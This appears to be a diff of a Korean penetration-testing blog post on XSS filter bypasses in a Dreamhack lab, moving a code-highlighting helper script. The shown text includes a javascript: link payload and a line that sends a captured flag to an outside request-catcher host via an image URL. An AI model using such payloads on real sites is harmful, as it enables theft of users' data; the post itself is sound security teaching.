@@ -68,6 +68,44 @@ Blacklist 필터링의 다양한 우회 기법들을 살펴보자. 예를 들어
 ```html
 <a href="javascript:alert(1);">LINK</a>
 ```
+<script>
+  (() => {
+    window.patchCodeLine = (lineNumber, override) => {
+      const code = document.currentScript.previousElementSibling.querySelector('code');
+
+      const patch = () => {
+        const line = code.querySelector(`.code-line[value="${lineNumber}"]`);
+        const lineContent = new DOMParser().parseFromString(override, 'text/html');
+
+        line.replaceChildren(...lineContent.body.childNodes);
+        line.appendChild(document.createTextNode('\n'));
+
+        observer.disconnect();
+      };
+
+      const observer = new MutationObserver(patch);
+
+      observer.observe(code, { attributes: true, attributeFilter: ['highlighted'] });
+
+      if (code.hasAttribute('highlighted')) patch();
+    };
+
+    patchCodeLine(1, [
+      '<span style="color:#24292E">&lt;</span>',
+      '<span style="color:#22863A">a</span>',
+      '<span style="color:#6F42C1"> href</span>',
+      '<span style="color:#24292E">=</span>',
+      '<span style="color:#032F62">"javascript:</span>',
+      '<span style="color:#6F42C1">alert</span>',
+      '<span style="color:#032F62">(</span>',
+      '<span style="color:#005CC5">1</span>',
+      '<span style="color:#032F62">);"</span>',
+      '<span style="color:#24292E">&gt;LINK&lt;/</span>',
+      '<span style="color:#22863A">a</span>',
+      '<span style="color:#24292E">&gt;</span>'
+    ].join(''));
+  })();
+</script>
 
 `<a>` 태그의 `href` 속성은 브라우저가 이동할 대상 경로를 지정한다. 만약 해당 속성에 `javascript:`로 시작하는 문자열이 포함될 경우, 브라우저는 이를 주소 창에 직접 입력한 것과 동일하게 인식하여 내포된 JavaScript 구문을 실행한다. 이러한 특성 역시 XSS 공격에 활용될 수 있으므로 주의가 필요하다.
 
@@ -264,35 +302,13 @@ Burp Suite를 활용하여 해당 위치가 정확히 어떤 요소인지 확인
        img.src = 'https://vxvufng.request.dreamhack.games/?flag=' + flag;
 ```
 <script>
-  (() => {
-    window.patchCodeLine = (lineNumber, override) => {
-      const code = document.currentScript.previousElementSibling.querySelector('code');
-
-      const patch = () => {
-        const line = code.querySelector(`.code-line[value="${lineNumber}"]`);
-        const lineContent = new DOMParser().parseFromString(override, 'text/html');
-
-        line.replaceChildren(...lineContent.body.childNodes);
-        line.appendChild(document.createTextNode('\n'));
-
-        observer.disconnect();
-      };
-
-      const observer = new MutationObserver(patch);
-
-      observer.observe(code, { attributes: true, attributeFilter: ['highlighted'] });
-
-      if (code.hasAttribute('highlighted')) patch();
-    };
-
-    patchCodeLine(6, [
-      '<span style="color:#24292E">       img.src </span>',
-      '<span style="color:#D73A49">=</span>',
-      '<span style="color:#032F62"> \'https://vxvufng.request.dreamhack.games/?flag=\'</span>',
-      '<span style="color:#D73A49"> +</span>',
-      '<span style="color:#24292E"> flag;</span>'
-    ].join(''));
-  })();
+  patchCodeLine(6, [
+    '<span style="color:#24292E">       img.src </span>',
+    '<span style="color:#D73A49">=</span>',
+    '<span style="color:#032F62"> \'https://vxvufng.request.dreamhack.games/?flag=\'</span>',
+    '<span style="color:#D73A49"> +</span>',
+    '<span style="color:#24292E"> flag;</span>'
+  ].join(''));
 </script>
 
 ![Basic Script Prac](/posts/penetration-testing-week-11/assets/10.webp)
